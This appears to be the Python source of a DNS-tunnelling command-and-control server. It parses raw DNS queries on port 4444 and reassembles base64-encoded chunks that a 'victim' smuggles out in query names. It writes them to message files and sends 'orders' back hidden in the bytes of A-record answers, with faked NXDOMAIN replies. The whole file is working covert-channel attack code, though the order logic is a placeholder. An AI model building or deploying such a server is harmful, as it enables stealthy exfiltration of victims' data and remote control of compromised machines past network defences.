import logging
import random
import socket
import threading
import time
import base64

localIP = "127.0.0.1"

localPort = 4444

bufferSize = 1024

messages_address = "./messages.txt"
responses_address = "./responses.txt"

# if True then server is sending orders to the victim.
# if False then victim is sending data to the server (and server is just sending ack).
is_server_talking = False

print("DNS server up and listening")

#
victim_data_list = {}  # all the data received from victim till now.

server_responses = {}  # completed all the server responses sent to the victim till now.

full_messages = {}  # completed messages received from client (union of all chunks with the same ID)

# counts the messages transferred between server and victim.
counter = 0


def make_full_message():
    """
    make a full message with all the chunks that belongs to the same ID
    """
    global victim_data_list
    global counter

    for message_id in victim_data_list:
        full_messages[message_id] = ''
        for message_chunk_index in victim_data_list[message_id]:
            message_chunk = victim_data_list[message_id][message_chunk_index]
            full_messages[message_id] += message_chunk
        counter = int(message_id)
        full_messages[message_id] = full_messages[message_id][:-3]
    victim_data_list = {}


def base64_decode(base64_string):
    """
    :param base64_string: string to be processed.
    :return: base64 format of the string
    """
    base64_bytes = base64_string.encode("ascii")
    sample_string_bytes = base64.b64decode(base64_bytes)
    decoded_string = sample_string_bytes.decode("ascii")
    return decoded_string


def save_victim_data_to_list(victim_data_base64):
    global victim_data_list
    global server_responses
    global is_server_talking

    decoded_string = base64_decode(victim_data_base64)
    if is_server_talking:
        return decoded_string
    message_id = decoded_string.split('_')[0]
    message_chunk = decoded_string.split('_')[1]
    total_len = len(message_id) + len(message_chunk) + 2
    message_info = decoded_string[total_len:]

    if message_id not in victim_data_list:
        json = {message_chunk: message_info}
        victim_data_list[message_id] = json
    else:
        json = victim_data_list[message_id]
        if message_chunk not in json:
            json[message_chunk] = message_info

    if message_info.endswith('___'):  # message has been finished
        make_full_message()
        is_server_talking = True
        victim_data_base64 = '0'

    return victim_data_base64


def well_formatted_order(order_string):
    """
    adds padding to the string to be sent to the victim.
    :param order_string: string to be processed.
    :return: right order of the string to be sent.
    """
    formatted_array = []
    for char in order_string:
        formatted_array.append(ord(char))
    while len(formatted_array) % 3 != 0:
        formatted_array.append(0)

    return formatted_array


def make_decision():
    """
    makes decision in order to what to tell victim based on victim message.
    :return: string to be sent to the victim.
    """
    return "Hello From The Server ! "


def save_data_to_file():
    global full_messages
    global server_responses

    print("full_messages = ", full_messages)
    print("server_responses = ", server_responses)
    # save messages
    try:
        with open(messages_address, 'a') as file:
            file.write(str(full_messages) + '\n')
    except Exception as e:
        print(f"Error: {e}")

    # save responses
    try:
        with open(responses_address, 'a') as file:
            file.write(str(server_responses) + '\n')
    except Exception as e:
        print(f"Error: {e}")

    full_messages = {}
    server_responses = {}


class DNSServer:

    def __init__(self):
        logging.info('Initializing Broker')
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((localIP, localPort))
        self.clients_list = []

    def listen_clients(self):
        while True:
            msg, client = self.sock.recvfrom(1024)
            logging.info('Received data from client %s: %s', client, msg)
            t = threading.Thread(target=self.talk_to_client, args=(msg, client))
            t.start()

    def talk_to_client(self, message, address):
        """
        parses the query and send back the response.
        :param message: query from the client.
        :param address: client address.
        """
        global is_server_talking
        global server_responses

        # parsing the query
        transaction_id = message[0:2]
        questions = message[4:6]
        authority_RRs = message[8:10]
        additional_RRs = message[10:12]
        name_arr = []

        i = 12
        while True:
            if message[i] == 0:
                break
            i = i + 1

        x = 12
        while True:
            if x == i:
                break
            number_of_bytes = message[x]
            name_arr.append(message[x + 1: x + 1 + number_of_bytes])
            x = x + number_of_bytes + 1

        name_arr_decoded = ""
        for k in name_arr:
            name_arr_decoded = name_arr_decoded + k.decode("utf-8") + "."
        name_arr_decoded = name_arr_decoded[:-1]
        i = i + 1

        type_a = message[i: i + 2]
        class_in = message[i + 2: i + 4]
        queries = message[12: i + 4]

        victim_data_base64 = name_arr_decoded.split('.')[0]
        victim_data_string = save_victim_data_to_list(victim_data_base64)

        # Stage 2, make the response
        transaction_id_ans = transaction_id
        flags_ans = 0x8180.to_bytes(2, 'big')
        questions_ans = questions
        answer_RRs_ans = questions
        authority_RRs_ans = authority_RRs
        additional_RRs_ans = additional_RRs
        queries_ans = queries
        additional_records_ans = b''
        name_ans = 0xc00c.to_bytes(2, 'big')
        type_a_ans = type_a
        class_in_ans = class_in
        ttl_ans = 0x0000003c.to_bytes(4, 'big')
        data_length_ans = 0x0004.to_bytes(2, 'big')

        if not is_server_talking:  # server is just sending acknowledgement.
            time.sleep(random.uniform(0, 0.1))
            flags_ans = 0x81a3.to_bytes(2, 'big')
            authoritative_nameservers_ans = 0x00000600010001517a004001610c726f6f742d73657276657273036e657400056e73746c640c766572697369676e2d67727303636f6d00789639bd000007080000038400093a8000015180.to_bytes(
                75, 'big')

            final_answer = transaction_id_ans + flags_ans + questions_ans + answer_RRs_ans + authority_RRs_ans + additional_RRs_ans + queries_ans + authoritative_nameservers_ans + additional_records_ans

        # Server must make orders now.
        else:
            order_string = make_decision()
            server_responses[counter] = order_string
            order_to_send = well_formatted_order(order_string)
            index = int(victim_data_string)
            if index == len(order_to_send) / 3 - 1:
                ip_arr = [0, order_to_send[index * 3], order_to_send[index * 3 + 1], order_to_send[index * 3 + 2]]
                is_server_talking = False
                save_data_to_file()  # saving data to file
            else:
                ip_arr = [255, order_to_send[index * 3], order_to_send[index * 3 + 1], order_to_send[index * 3 + 2]]

            ip0 = int(ip_arr[0]).to_bytes(1, 'big')
            ip1 = int(ip_arr[1]).to_bytes(1, 'big')
            ip2 = int(ip_arr[2]).to_bytes(1, 'big')
            ip3 = int(ip_arr[3]).to_bytes(1, 'big')

            final_answer = transaction_id_ans + flags_ans + questions_ans + answer_RRs_ans + authority_RRs_ans + additional_RRs_ans + queries_ans + name_ans + type_a_ans + class_in_ans + ttl_ans + data_length_ans + ip0 + ip1 + ip2 + ip3 + additional_records_ans

        self.sock.sendto(final_answer, address)
